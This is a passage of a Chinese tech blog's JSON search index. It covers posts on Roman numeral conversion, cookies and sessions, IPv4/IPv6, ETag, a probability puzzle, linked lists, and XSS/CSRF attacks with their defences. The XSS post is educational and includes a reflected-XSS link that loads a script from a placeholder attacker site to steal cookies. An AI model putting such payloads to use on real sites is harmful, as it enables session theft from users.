matrix&#125;","categories":[{"name":"技术","slug":"技术","permalink":"https://wtaufpziv.github.io/categories/%E6%8A%80%E6%9C%AF/"},{"name":"计算机通识","slug":"技术/计算机通识","permalink":"https://wtaufpziv.github.io/categories/%E6%8A%80%E6%9C%AF/%E8%AE%A1%E7%AE%97%E6%9C%BA%E9%80%9A%E8%AF%86/"},{"name":"数据结构与算法","slug":"技术/计算机通识/数据结构与算法","permalink":"https://wtaufpziv.github.io/categories/%E6%8A%80%E6%9C%AF/%E8%AE%A1%E7%AE%97%E6%9C%BA%E9%80%9A%E8%AF%86/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95/"}],"tags":[]},{"title":"leetcode-罗马数字与阿拉伯数字的转换","slug":"leetcode-罗马数字与阿拉伯数字的转换","date":"2020-04-06T16:00:00.000Z","updated":"2024-05-25T04:21:29.805Z","comments":true,"path":"2020/04/07/leetcode-罗马数字与阿拉伯数字的转换/","link":"","permalink":"https://wtaufpziv.github.io/2020/04/07/leetcode-%E7%BD%97%E9%A9%AC%E6%95%B0%E5%AD%97%E4%B8%8E%E9%98%BF%E6%8B%89%E4%BC%AF%E6%95%B0%E5%AD%97%E7%9A%84%E8%BD%AC%E6%8D%A2/","excerpt":"罗马数字与阿拉伯数字互相转换（难度：中等）罗马数字包含以下七种字符： I， V， X， L，C，D 和 M。 罗马数字 2 写做 II ，即为两个并列的 1。12 写做 XII ，即为 X + II 。 27 写做 XXVII, 即为 XX + V + II 通常情况下，罗马数字中小的数字在大的数字的右边。但也存在特例，例如 4 不写做 IIII，而是 IV。数字 1 在数字 5 的左边，所表示的数等于大数 5 减小数 1 得到的数值 4 。同样地，数字 9 表示为 IX。这个特殊的规则只适用于以下六种情况： I 可以放在 V (5) 和 X (10) 的左边，来表示 4 和 9。X 可以放在 L (50) 和 C (100) 的左边，来表示 40 和 90。C 可以放在 D (500) 和 M (1000) 的左边，来表示 400 和 900。","text":"罗马数字与阿拉伯数字互相转换（难度：中等）罗马数字包含以下七种字符： I， V， X， L，C，D 和 M。 罗马数字 2 写做 II ，即为两个并列的 1。12 写做 XII ，即为 X + II 。 27 写做 XXVII, 即为 XX + V + II 通常情况下，罗马数字中小的数字在大的数字的右边。但也存在特例，例如 4 不写做 IIII，而是 IV。数字 1 在数字 5 的左边，所表示的数等于大数 5 减小数 1 得到的数值 4 。同样地，数字 9 表示为 IX。这个特殊的规则只适用于以下六种情况： I 可以放在 V (5) 和 X (10) 的左边，来表示 4 和 9。X 可以放在 L (50) 和 C (100) 的左边，来表示 40 和 90。C 可以放在 D (500) 和 M (1000) 的左边，来表示 400 和 900。 阿拉伯数字转罗马数字核心的思想就是使用贪心算法，考虑到题目中所说存在左边的罗马数字小于右边的罗马数字的特殊情况，我们使用一个哈希表来存贮所有可能的元组合。然后实行贪心算法 代码如下： 123456789101112131415var intToRoman = function(num) &#123; let n = [1000, 900, 500, 400, 100, 90, 50, 40, 10, 9, 5, 4, 1], str = ['M', 'CM', 'D', 'CD', 'C', 'XC', 'L', 'XL', 'X', 'IX', 'V', 'IV', 'I'], res = '' while(num &gt; 0)&#123; if(num &lt; n[0])&#123; n.shift() str.shift() continue &#125; num -= n[0] res += str[0] &#125; return res&#125;; 罗马数字转阿拉伯数字遍历传入的字串，但是每次遍历要往后多看一位，如果当前罗马字母代表的数字小于下一个罗马字母代表的数字，那么需要作减法之后加到结果上，否则直接加到结果上 代码如下： 1234567891011121314151617181920212223242526272829303132var romanToInt = function(s) &#123; let str = &#123; 'M' : 1000, 'CM' : 900, 'D' : 500, 'CD' : 400, 'C' : 100, 'XC' : 90, 'L' : 50, 'XL' : 40, 'X' : 10, 'IX' :9, 'V' : 5, 'IV' : 4, 'I' : 1, &#125;, res = 0 let arr = s.split('') while(arr.length &gt; 0)&#123; if(str[arr[0]] &lt; (str[arr[1]] || 0))&#123; res += (str[arr[1]] - str[arr[0]]) arr.shift() arr.shift() &#125; else&#123; res += str[arr[0]] arr.shift() &#125; &#125; return res&#125;;","categories":[{"name":"技术","slug":"技术","permalink":"https://wtaufpziv.github.io/categories/%E6%8A%80%E6%9C%AF/"},{"name":"计算机通识","slug":"技术/计算机通识","permalink":"https://wtaufpziv.github.io/categories/%E6%8A%80%E6%9C%AF/%E8%AE%A1%E7%AE%97%E6%9C%BA%E9%80%9A%E8%AF%86/"},{"name":"数据结构与算法","slug":"技术/计算机通识/数据结构与算法","permalink":"https://wtaufpziv.github.io/categories/%E6%8A%80%E6%9C%AF/%E8%AE%A1%E7%AE%97%E6%9C%BA%E9%80%9A%E8%AF%86/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95/"}],"tags":[]},{"title":"session与cookie","slug":"session与cookie","date":"2020-04-06T16:00:00.000Z","updated":"2024-05-25T02:28:45.257Z","comments":true,"path":"2020/04/07/session与cookie/","link":"","permalink":"https://wtaufpziv.github.io/2020/04/07/session%E4%B8%8Ecookie/","excerpt":"应用场景cookie:登录网站，第一天输入用户名密码登录了，第二天再打开很多情况下就直接打开了。这个时候用到的一个机制就是cookie。 session:session一个场景是购物车，添加了商品之后客户端处可以知道添加了哪些商品，而服务器端如何判别呢，所以也需要存储一些信息就用到了session。","text":"应用场景cookie:登录网站，第一天输入用户名密码登录了，第二天再打开很多情况下就直接打开了。这个时候用到的一个机制就是cookie。 session:session一个场景是购物车，添加了商品之后客户端处可以知道添加了哪些商品，而服务器端如何判别呢，所以也需要存储一些信息就用到了session。 cookie使用服务器通过设置set-cookie这个响应头，将cookie信息返回给浏览器，浏览器将响应头中的cookie信息保存在本地，当下次向服务器发送HTTP请求时，浏览器会自动将保存的这些cookie信息添加到请求头中。 通过cookie，服务器就会识别出浏览器，从而保证返回的数据是这个用户的。 通过set-cookie设置 下次请求会自动带上 键值对，可设置多个 cookie属性 max-age 过期时间有多长 默认在浏览器关闭时失效 expires 到哪个时间点过期 secure 表示这个cookie只会在https的时候才会发送 HttpOnly 设置后无法通过在js中使用document.cookie访问 保障安全，防止攻击者盗用用户cookie domain 表示该cookie对于哪个域是有效的。 session概念 存放在服务器的一种用来存放用户数据的类似HashTable的结构 浏览器第一次发送请求时，服务器自动生成了HashTable和SessionID来唯一标识这个hash表，并将sessionID存放在cookie中通过响应发送到浏览器。浏览器第二次发送请求会将前一次服务器响应中的sessionID随着cookie发送到服务器上，服务器从请求中提取sessionID，并和保存的所有sessionID进行对比，找到这个用户对应的hash表。 一般这个值是有时间限制的，超时后销毁，默认30min 当用户在应用程序的web页面间挑转时，存储在session对象中的变量不会丢失而是在整个用户会话中一直存在下去。 session依赖于cookie，因为sessionID是存放在cookie中的。 session与cookie的区别 cookie存在客户端，session存在于服务端。 cookie在客户端中存放，容易伪造，不如session安全 session会消耗大量服务器资源，cookie在每次HTTP请求中都会带上，影响网络性能 域的支持范围不一样，比方说a.com的Cookie在a.com下都能用，而www.a.com的Session在api.a.com下都不能用","categories":[{"name":"技术","slug":"技术","permalink":"https://wtaufpziv.github.io/categories/%E6%8A%80%E6%9C%AF/"},{"name":"计算机通识","slug":"技术/计算机通识","permalink":"https://wtaufpziv.github.io/categories/%E6%8A%80%E6%9C%AF/%E8%AE%A1%E7%AE%97%E6%9C%BA%E9%80%9A%E8%AF%86/"},{"name":"计算机网络","slug":"技术/计算机通识/计算机网络","permalink":"https://wtaufpziv.github.io/categories/%E6%8A%80%E6%9C%AF/%E8%AE%A1%E7%AE%97%E6%9C%BA%E9%80%9A%E8%AF%86/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/"}],"tags":[]},{"title":"ipv4与ipv6","slug":"ipv4与ipv6","date":"2020-04-05T16:00:00.000Z","updated":"2024-05-25T04:21:29.805Z","comments":true,"path":"2020/04/06/ipv4与ipv6/","link":"","permalink":"https://wtaufpziv.github.io/2020/04/06/ipv4%E4%B8%8Eipv6/","excerpt":"地址大小ipv4长度为 32 位（4 个字节）。地址由网络和主机部分组成，这取决于地址类。根据地址的前几位，可定义各种地址类：A、B、C、D 或 E。IPv4 地址的总数为 4 294 967 296。IPv4 地址的文本格式为 nnn.nnn.nnn.nnn，其中 0&lt;=nnn&lt;=255，而每个 n 都是十进制数。可省略前导零。最大打印字符数为 15 个，不计掩码。","text":"地址大小ipv4长度为 32 位（4 个字节）。地址由网络和主机部分组成，这取决于地址类。根据地址的前几位，可定义各种地址类：A、B、C、D 或 E。IPv4 地址的总数为 4 294 967 296。IPv4 地址的文本格式为 nnn.nnn.nnn.nnn，其中 0&lt;=nnn&lt;=255，而每个 n 都是十进制数。可省略前导零。最大打印字符数为 15 个，不计掩码。 ipv6长度为 128 位（16 个字节）。基本体系结构的网络数字为 64 位，主机数字为 64 位。通常，IPv6 地址（或其部分）的主机部分将派生自 MAC 地址或其他接口标识。根据子网前缀，IPv6 的体系结构比 IPv4 的体系结构更复杂。 IPv6 地址的数目比 IPv4 地址的数目大 1028倍。IPv6 地址的文本格式为 xxxx:xxxx:xxxx:xxxx:xxxx:xxxx:xxxx:xxxx，其中每个 x 都是十六进制数，表示 4 位。可省略前导零。可在地址的文本格式中使用一次双冒号（::），用于指定任意数目的 0 位 地址分配ipv4最初，按网络类分配地址。随着地址空间的消耗，使用“无类域间路由”（CIDR）进行更小的分配。没有在机构和国家或地区之间平均分配地址。 ipv6分配尚处于早期阶段。“因特网工程任务组织”（IETF ）和“因特网体系结构委员会”（IAB）建议基本上为每个组织、家庭或实体分配一个 /48 子网前缀长度。它将保留 16 位供组织进行子网划分。地址空间是足够大的，可为世界上每个人提供一个其自己的 /48 子网前缀长度。. 其他ipv6的路由表更小。（1）可使路由器能在路由表中，用一条记录表示一片子网。（2）大大减小了路由器中路由表的长度，提高了路由器转发数据包的速度。 IPv6的组播支持以及对流的支持增强。这使得网络上的多媒体应用有了长足发展的机会，为服务质量控制提供了良好的网络平台。 IPv6加入了对自动配置的支持。IPv6具有更高的安全性。在使用IPv6网络中，用户可以对网络层的数据进行加密并对IP报文进行校验，这极大地增强了网络安全。 IPv6允许协议扩充。IPv6使用新的头部格式，简化和加速了路由选择过程，因为大多数的选项不需要由路由选择。","categories":[{"name":"技术","slug":"技术","permalink":"https://wtaufpziv.github.io/categories/%E6%8A%80%E6%9C%AF/"},{"name":"计算机通识","slug":"技术/计算机通识","permalink":"https://wtaufpziv.github.io/categories/%E6%8A%80%E6%9C%AF/%E8%AE%A1%E7%AE%97%E6%9C%BA%E9%80%9A%E8%AF%86/"},{"name":"计算机网络","slug":"技术/计算机通识/计算机网络","permalink":"https://wtaufpziv.github.io/categories/%E6%8A%80%E6%9C%AF/%E8%AE%A1%E7%AE%97%E6%9C%BA%E9%80%9A%E8%AF%86/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/"}],"tags":[]},{"title":"简单了解etag","slug":"简单了解etag","date":"2020-04-04T16:00:00.000Z","updated":"2024-05-25T02:28:45.282Z","comments":true,"path":"2020/04/05/简单了解etag/","link":"","permalink":"https://wtaufpziv.github.io/2020/04/05/%E7%AE%80%E5%8D%95%E4%BA%86%E8%A7%A3etag/","excerpt":"浅谈etag","text":"浅谈etag ETag是一个可以与Web资源关联的记号（token）。典型的Web资源可以一个Web页，但也可能是JSON或XML文档。服务器单独负责判断记号是什么及其含义，并在HTTP响应头中将其传送到客户端，以下是服务器端返回的格式： ETag:”50b1c1d4f775c61:df3” 客户端的查询更新格式是这样的： If-None-Match : W / “50b1c1d4f775c61:df3” 如果ETag没改变，则返回状态304然后不返回，这也和Last-Modified一样 Etag - 作用Etag 主要为了解决 Last-Modified 无法解决的一些问题。 1、一些文件也许会周期性的更改，但是他的内容并不改变(仅仅改变的修改时间)，这个时候我们并不希望客户端认为这个文件被修改了，而重新GET; 2、某些文件修改非常频繁，比如在秒以下的时间内进行修改，(比方说1s内修改了N次)，If-Modified-Since能检查到的粒度是s级的，这种修改无法判断(或者说UNIX记录MTIME只能精确到秒) 3、某些服务器不能精确的得到文件的最后修改时间； 为此，HTTP/1.1 引入了 Etag(Entity Tags).Etag仅仅是一个和文件相关的标记，可以是一个版本标记,比如说v1.0.0或者说”2e681a-6-5d044840”这么一串看起来 很神秘的编码。但是HTTP/1.1标准并没有规定Etag的内容是什么或者说要怎么实现 etag生成的方式强etag强Etag根据配置文件中的配置来设置Etag值，默认的Apache的FileEtag设置为： FileEtag INode Mtime Size 也就是根据这三个属性来生成Etag值，他们之间通过一些算法来实现，并输出成hex的格式，相邻属性之间用-分隔，比如： Etag”2e681a-6-5d044840” 这里面的三个段，分别代表了INode，MTime，Size根据算法算出的值的Hex格式，(如果在这里看到了非Hex里面的字符(也就是0-f)，那你可能看见神了:)) 当然，可以改变Apache的FileEtag设置，比如设置成FileEtagSize,那么得到的Etag可能为： Etag”6” 总之，设置了几个段，Etag值就有几个段。(不要误以为Etag就是固定的3段式) 说明 这里说的都是Apache2.2里面的Etag实现，因为HTTP/1.1并没有规定Etag必须是什么样的实现或者格式，因此，也可 以修改或者完全编写自己的算法得到Etag，比如”2e681a65d044840”，客户端会记住并缓存下这个Etag(Windows里面保存在哪 里，下次访问的时候直接拿这个值去和服务器生成的Etag对比。 注意不管怎么样的算法，在服务器端都要进行计算，计算就有开销，会带来性能损失。因此为了榨干这一点点性能，不少网站完全把Etag禁用了(比如Yahoo!)，这其实不符合HTTP/1.1的规定，因为HTTP/1.1总是鼓励服务器尽可能的开启Etag。 弱etag重新考虑前面提到的3个问题： 问题1、一些文件也许会周期性的更改，但是他的内容并不改变(仅仅改变的修改时间)，这个时候我们并不希望客户端认为这个文件被修改了，而重新GET; 解决办法：如果使用强Etag，每次得会要求重新GET页面，如果使用Etag，比方说设置成 File Etag Size 等，就可以忽略 MTime 造成的 Last-Modified 时间修改从而影响了 If-Modified-Since(IMS) 这个校验了。这点和弱Etag无关。 问题2、某些文件修改非常频繁，比如在秒以下的时间内进行修改，(比方说1s内修改了N次)，If-Modified-Since能检查到的粒度是s级的，这种修改无法判断(或者说UNIX记录MTIME只能精确到秒) 解决办法：如果是这种情况，Apache会自动判断请求时间和修改时间之间的差值，如果小于1s，Apache会认为这个文件在这1秒内可能会再次被修改， 因此生成一个弱Etag(WeakEtag),这个Etag仅仅基于MTime来生成，因此MTime只能精确到s，所以1s内生成的Etag总是一样， 这样就避免了使用强Etag造成的1s内频繁的刷新Cache的情况。(貌似不用Etag，仅仅使用Last-Modified就可以解决，但是这针对的 仅仅是修改超级频繁的情况，很多文件可能同时也使用强Etag验证)。弱Etag以W/开始，比如:W/“2e681a” 问题3、某些服务器不能精确的得到文件的最后修改时间； 解决办法：生成Etag，因为Etag可以综合Inode，MTime和Size，可以避免这个问题","categories":[{"name":"技术","slug":"技术","permalink":"https://wtaufpziv.github.io/categories/%E6%8A%80%E6%9C%AF/"},{"name":"计算机通识","slug":"技术/计算机通识","permalink":"https://wtaufpziv.github.io/categories/%E6%8A%80%E6%9C%AF/%E8%AE%A1%E7%AE%97%E6%9C%BA%E9%80%9A%E8%AF%86/"},{"name":"计算机网络","slug":"技术/计算机通识/计算机网络","permalink":"https://wtaufpziv.github.io/categories/%E6%8A%80%E6%9C%AF/%E8%AE%A1%E7%AE%97%E6%9C%BA%E9%80%9A%E8%AF%86/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/"}],"tags":[]},{"title":"浅谈xss与csrf的攻与防","slug":"浅谈xss与csrf的攻与防","date":"2020-04-02T16:00:00.000Z","updated":"2024-05-25T04:21:29.360Z","comments":true,"path":"2020/04/03/浅谈xss与csrf的攻与防/","link":"","permalink":"https://wtaufpziv.github.io/2020/04/03/%E6%B5%85%E8%B0%88xss%E4%B8%8Ecsrf%E7%9A%84%E6%94%BB%E4%B8%8E%E9%98%B2/","excerpt":"回顾一下cookie","text":"回顾一下cookie cookie是网站存储在用户本地用于标识来访者唯一认证身份的依据。 来做个形象的比喻，有一天，小A去了一家新开的理发店，店里的托尼老师不认识小A，于是小A就办了一张VIP卡，当小A第二次去这家理发店的时候，店里的托尼老师刷了下小A的卡，想起来了你是小A啊，今天搞什么样的造型啊~ Cookie就是那张VIP卡，用于辨别用户身份。 采用 Name = Value 的键值对形式存储数据，Name是唯一的 Domain：域名，限制哪些域名下可以使用（该VIP卡仅限本店使用） Path：路径，只有这个路径前缀的才可用（该VIP卡仅限烫头） Expires：过期时间（该VIP卡有效期一年） HTTP（HTTPOnly）：只有浏览器请求时，才会在请求头中带着，JavaScript无法读写 Secure：非HTTPS请求时不带 SameSite：用于定义cookie如何跨域发送 xss跨站脚本攻击通常是带有页面可解析内容的数据未经处理直接插入到页面上解析造成的。XSS根据攻击脚本的引入位置来区分为存储型XSS、反射型XSS以及MXSS（也叫DOM XSS）三种 存储型xss假设有一个论坛存在XSS漏洞，用户小A在该论坛的一篇帖子中留言到当小A写的留言被该论坛保存下来之后，如果有其他的用户看到了这条评论（相当于打开了这个页面，执行了hark.js，hark.js里面内容大致是获取Cookie，发送请求），那么这些用户的Cookie都会发送到小A事先写好的信息收集网站中进行保存，然后小A就可以用这些Cookie进行登录啦。 上述这种XSS攻击属于存储型，提交的代码会被存储在服务器端，下次请求目标网站时不用再提交XSS代码。所以这种类型的主要原因是前端提交的数据未经处理直接存储到数据库，然后从数据库中读取出来后直接插入到页面中导致的。 反射性xss假设有一个网站lalala存在XSS漏洞，网址是http://www.lalala.com。然后有一天小A在邮件里发现一封邮件，内容是一张你懂得图片然后配下面的标签。 1&lt;a href = \"http://www.lalala.com?x=&lt;script src = http://攻击者网站/hacker.js&gt;&gt;凤姐最新性感视频&lt;/a&gt; 小A好奇啊，然后就点了进去，如果在此之前小A登录过lalala网站，那么他的Cookie就被盗走了。 这种XSS攻击属于反射型，发出请求时，XSS代码出现在URL中，作为输入提交到服务器，服务器解析后响应，XSS代码随着响应内容一起传回给浏览器，最后浏览器解析执行XSS代码。这个过程像一次反射，故叫做反射型XSS。 mxss在渲染DOM属性时将攻击脚本插入DOM属性中被解析而导致的。 对应的解决方案 服务端可以做以下动作： 1、刚刚上面讲到Cookie中有个属性时HTTP，设置为True，不允许JavaScript读取cookies，但该属性只适配部分浏览器。对于HTTPS可以设置Secure 2、处理富文本框输入内容，进行XSS过滤，过滤类似script、iframe、form等标签以及转义存储 客户端可以做以下动作： 1、输入检查，和服务端一样都要做。2、输出检查，编码转义，如果使用jquery，就是那些append、html、before、after等，插入DOM的方法需要注意。现今大部分的MV*框架在模板（view层）会自动处理XSS问题。 CSRF跨站请求伪造攻击 CSRF（Cross-site request forgery）跨站请求伪造=，是一种对网站的恶意利用。 尽管听起来像跨站脚本（XSS），但它与XSS非常不同，XSS利用站点内的信任用户，而CSRF则通过伪装成受信任用户的请求来利用受信任的网站。 攻击原理 用户打开浏览器，访问受信任网站A，输入用户名和密码请求登录网站A。 在用户信息通过验证后，网站A产生Cookie信息并返回给浏览器。 用户在未退出网站A之前，在同一浏览器中，打开一个TAB页访问网站B。 网站B接收到用户请求后，发出一个访问网站A的请求。 浏览器根据网站B的请求，在用户不知情的情况下携带Cookie信息，向网站A发出请求。网站A并不知道该请求其实是由B发起的，所以会根据用户的Cookie信息处理该请求，达到模拟用户操作的目的。 tips：Session Cookie（在浏览器关闭后，就会失效，保存到内存） Third-party Cookie（关闭浏览器后，不会失效，保存到本地） 常见的CSRF攻击：Get请求，操作数据库内容比如网站A的修改密码接口是GET方式，通过调用api/ChangePassword？psw=123就可以进行密码的修改，所以在开发的过程中如果涉及到数据改动都建议采用POST请求 隐藏表单提交POST请求单纯的POST当然也是能伪造的，JS利用form表单可以跨域请求的特性的提交POST请求仍然能够产生CSRF攻击。 XSRF通常来说CSRF是由XSS实现的，所以CSRF时常也被称为XSRF，用XSS的方式实现伪造请求，比如网站A存在XSS漏洞，被注入恶意代码后，当有用户访问到有恶意代码的网页的时候，就会发送一条类似转账，关注啊之类的请求，做到XSRF攻击。 防范方法Referer（记录 HTTP 请求的来源地址） Check好处是只需要增加一个拦截器来检查 Referer ，用于过滤非该服务器域名的地址，不需要改变当前系统的任何已有代码和逻辑，非常快捷。 但是，Referer 的值是由浏览器提供的，虽然 HTTP 协议上有明确的要求，但是每个浏览器对于 Referer 的具体实现可能有差别，并不能保证浏览器自身没有安全漏洞。使用验证 Referer 值的方法，就是把安全性都依赖于第三方（即浏览器）来保障，不是很靠谱，并且一些低版本的浏览器像IE6等有方法对Referer 进行篡改。还有重要的一点是，用户可以设置浏览器不携带 Referer字段。 验证码强制用户必须与应用进行交互，才能完成最终请求。在通常情况下，验证码能很好遏制CSRF攻击。但是出于用户体验考虑，网站不能给所有的操作都加上验证码。因此验证码只能作为一种辅助手段，不能作为主要解决方案 Token两种使用形式：在参数中添加（无需改变现有交互模式），在请求头中添加（需要将请求改为使用XMLHttpRequest） 在 HTTP 请求中以参数的形式添加一个随机产生的 token，并在服务器端建立一个拦截器来验证这个 token，假设请求中没有 token 或者 token 内容不对，则觉得可能是 CSRF 攻击而拒绝该请求。并且涉及数据库操作的接口使用POST，因为GET不好加Token，会暴露Token的保密性。 关于token： Token 应该保存到 local / session stograge（不会跨域工作） 或者 cookies Tokens 除了像 cookie 一样有有效期，还要提供过期重新获取、强制刷新、撤回等操作 有需要的话，要加密并且签名 token 将 JSON Web Tokens（JWT） 应用到 OAuth 2 总结xss和csrf的区别 区别一，发生位置 XSS：发生在客户端 CSRF：发生在服务端 区别二，原理 XSS：注入代码，执行代码，篡改内容 CSRF：携带Cookie模拟请求 区别三，根源 XSS：同源策略机制 CSRF：Web隐式身份验证机制 区别四，就Cookie而言 XSS：盗取Cookie来干坏事 CSRF：借用Cookie来干坏事","categories":[{"name":"技术","slug":"技术","permalink":"https://wtaufpziv.github.io/categories/%E6%8A%80%E6%9C%AF/"},{"name":"计算机通识","slug":"技术/计算机通识","permalink":"https://wtaufpziv.github.io/categories/%E6%8A%80%E6%9C%AF/%E8%AE%A1%E7%AE%97%E6%9C%BA%E9%80%9A%E8%AF%86/"},{"name":"计算机网络","slug":"技术/计算机通识/计算机网络","permalink":"https://wtaufpziv.github.io/categories/%E6%8A%80%E6%9C%AF/%E8%AE%A1%E7%AE%97%E6%9C%BA%E9%80%9A%E8%AF%86/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/"}],"tags":[]},{"title":"360的抽奖","slug":"360的抽奖","date":"2020-03-23T16:00:00.000Z","updated":"2024-05-25T02:28:45.242Z","comments":true,"path":"2020/03/24/360的抽奖/","link":"","permalink":"https://wtaufpziv.github.io/2020/03/24/360%E7%9A%84%E6%8A%BD%E5%A5%96/","excerpt":"360的抽奖抽奖箱内现有m+n张奖票，m张中奖的，n张不中奖的，现在a和b两个人来轮流抽奖，a抽一张b抽一张，谁先抽到有奖的谁赢。由于b是a的爸爸，b暴打了a一顿之后迫使a答应了b一个特权，b每次抽完一张之后可以再抽一张，但是第二次抽出来的这张直接丢弃，不算b的结果。问：输入m和n，在a先抽的情况下求a获胜的概率(抽奖全程不放回)","text":"360的抽奖抽奖箱内现有m+n张奖票，m张中奖的，n张不中奖的，现在a和b两个人来轮流抽奖，a抽一张b抽一张，谁先抽到有奖的谁赢。由于b是a的爸爸，b暴打了a一顿之后迫使a答应了b一个特权，b每次抽完一张之后可以再抽一张，但是第二次抽出来的这张直接丢弃，不算b的结果。问：输入m和n，在a先抽的情况下求a获胜的概率(抽奖全程不放回) 示例： 输入1 3输出0.5 输入2 3输出0.6 这道题我使用记忆数组+动态规划的方式。 维护一个二维数组arr，纵向为中奖票数，横向为未中奖票数, 那么arr[i][j]的位置的值就是a获胜的概率我们先初始化这个数组 0 1 2 3 0 0 0 0 0 1 1 0 0 0 2 1 0 0 0 3 1 0 0 0 箱子里没有一张中奖票时，a获胜概率自然就是0，当箱子里全是中奖票时，a获胜概率自然就是1 这道题的动态规划思路如下：对于每一轮抽奖， a其实有就只有两个可能性，要么在这一步就抽到了奖票，要么没抽到。 当a没抽到奖票时并不代表a输了，只要b这个时候第一张抽到的不是奖票，那么a自然又获得了一次抽奖机会 所以对于arr[i][j]处的概率，无非就是这一次就抽到奖的概率，加上b没有抽到的概率乘以a再次获得抽奖机会后抽到奖的概率。很明显之后的计算结果依赖于之前的计算结果，是一个动态规划的过程 举个例子：当m=1，n=3，我们设为（1,3）,假设我们已经算出了（1,1）和（1,2）,那么表如下 0 1 2 3 0 0 0 0 0 1 1 1/2 1/3 0 2 1 0 0 0 3 1 0 0 0 此时奖池的状态是（1，3） 首先a一上来就中奖的概率是1/4，没中奖的概率是3/4。 如果a没中奖，很明显a抽走了一张没中奖的奖票，所以b来抽奖的时候，奖池的状态是（1,2）。b需要抽两张，要想b不中奖，这个时候就分为两种情况 b抽的两张都没有奖，概率是：(2/3) * (1/2) = 1/3，抽完之后奖池状态是（1， 0） b先抽了一张没奖的，又抽了一张有奖的，概率是(2/3) * (1/2) = 1/3，抽完之后奖池的状态是（0， 1） b抽完之后，a再次获得抽奖机会，这个时候奖池的两种可能状态如上。那么就可以再次查表，查找这两个奖池状态下a的获胜概率即可 综上所述，可求得答案：1/4 + 3/4 * 1/3 * 1 + 3/4 * 1/3 * 0 = 1/2 于是更新数组arr[1][3]处的结果为1/2 0 1 2 3 0 0 0 0 0 1 1 1/2 1/3 1/2 2 1 0 0 0 3 1 0 0 0 代码如下： 12345678910111213141516171819202122function so(a, b)&#123; let arr = [] for(let i = 0; i &lt;= a; i++)&#123; arr[i] = new Array(b + 1) for(let j = 0; j &lt;= b; j++)&#123; if(j === 0 &amp;&amp; i !== 0) arr[i][j] = 1 else&#123; arr[i][j] = 0 &#125; &#125; &#125; for(let i = 1; i &lt;= a; i++)&#123; for(let j = 1; j &lt;= b; j++)&#123; let p1 = (j &gt; 2) ? (((j - 1)/(i + j - 1)) * ((j - 1 - 1)/(i + j - 2))) : 0 let p2 = (i &gt; 1 &amp;&amp; j &gt; 1) ? (((j - 1)/(i + j - 1)) * ((i)/(i + j - 2))) : 0 arr[i][j] = (i / (i + j)) + (j/(i + j)) * p1 * arr[i][(j - 3) &gt;= 0 ? (j - 3) : 0] + (j/(i + j)) * p2 * arr[i - 1][(j - 2) &gt; 0 ? (j - 2) : 0] &#125; &#125; return arr[a][b]&#125;","categories":[{"name":"技术","slug":"技术","permalink":"https://wtaufpziv.github.io/categories/%E6%8A%80%E6%9C%AF/"},{"name":"计算机通识","slug":"技术/计算机通识","permalink":"https://wtaufpziv.github.io/categories/%E6%8A%80%E6%9C%AF/%E8%AE%A1%E7%AE%97%E6%9C%BA%E9%80%9A%E8%AF%86/"},{"name":"数据结构与算法","slug":"技术/计算机通识/数据结构与算法","permalink":"https://wtaufpziv.github.io/categories/%E6%8A%80%E6%9C%AF/%E8%AE%A1%E7%AE%97%E6%9C%BA%E9%80%9A%E8%AF%86/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95/"}],"tags":[]},{"title":"剑指offer面试题52-两个链表的第一个公共节点","slug":"剑指offer面试题52-两个链表的第一个公共节点","date":"2020-03-21T16:00:00.000Z","updated":"2024-05-25T02:28:45.272Z","comments":true,"path":"2020/03/22/剑指offer面试题52-两个链表的第一个公共节点/","link":"","permalink":"https://wtaufpziv.github.io/2020/03/22/%E5%89%91%E6%8C%87offer%E9%9D%A2%E8%AF%95%E9%A2%9852-%E4%B8%A4%E4%B8%AA%E9%93%BE%E8%A1%A8%E7%9A%84%E7%AC%AC%E4%B8%80%E4%B8%AA%E5%85%AC%E5%85%B1%E8%8A%82%E7%82%B9/","excerpt":"剑指offer面试题52：两个链表的第一个公共节点","text":"剑指offer面试题52：两个链表的第一个公共节点 这道题首先可以用暴搜，先遍历第一个链表，对于遍历到的节点再去第二个链表里面依次查找，若找到公共节点就返回。显而易见，这种方法的时间复杂度为O(m * n)， 并不是最好的解决方案 其实要寻找两个链表的第一个公共节点，就是分别从两个链表尾部向前搜索，一直搜到较短链表的头部，那么最后一次相等的节点，就是两个链表的第一个公共节点。但是单链表只能从前往后访问，于是我们可以用空间换时间的思想，利用两个栈，实现从后往前访问链表 代码如下：12345678910111213141516171819202122232425function FindFirstCommonNode(pHead1, pHead2)&#123; // write code here let p1 = pHead1 let p2 = pHead2 let stack1 = [] let stack2 = [] let k while(p1)&#123; stack1.push(p1) p1 = p1.next &#125; while(p2)&#123; stack2.push(p2) p2 = p2.next &#125; while(stack1.length &gt; 0 &amp;&amp; stack2.length &gt; 0)&#123; let a = stack1.pop() let b = stack2.pop() if(a === b)&#123; k = a &#125; &#125; return k&#125;","categories":[{"name":"技术","slug":"技术","permalink":"https://wtaufpziv.github.io/categories/%E6%8A%80%E6%9C%AF/"},{"name":"计算机通识","slug":"技术/计算机通识","permalink":"https://wtaufpziv.github.io/categories/%E6%8A%80%E6%9C%AF/%E8%AE%A1%E7%AE%97%E6%9C%BA%E9%80%9A%E8%AF%86/"},{"name":"数据结构与算法","slug":"技术/计算机通识/数据结构与算法","permalink":"https://wtaufpziv.github.io/categories/%E6%8A%80%E6%9C%AF/%E8%AE%A1%E7%AE%97%E6%9C%BA%E9%80%9A%E8%AF%86/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95/"}],"tags":[]},{"title":"代金券组合问题（DP）","slug":"代金券组合问题（DP）","date":"2020-03-18T16:00:00.000Z","updated":"2024-05-25T02:28:45.261Z","comments":true,"path":"2020/03/19/代金券组合问题（DP）/","link":"","permalink":"https://wtaufpziv.github.io/2020/03/19/%E4%BB%A3%E9%87%91%E5%88%B8%E7%BB%84%E5%90%88%E9%97%AE%E9%A2%98%EF%BC%88DP%EF%BC%89/","excerpt":"代金券组合"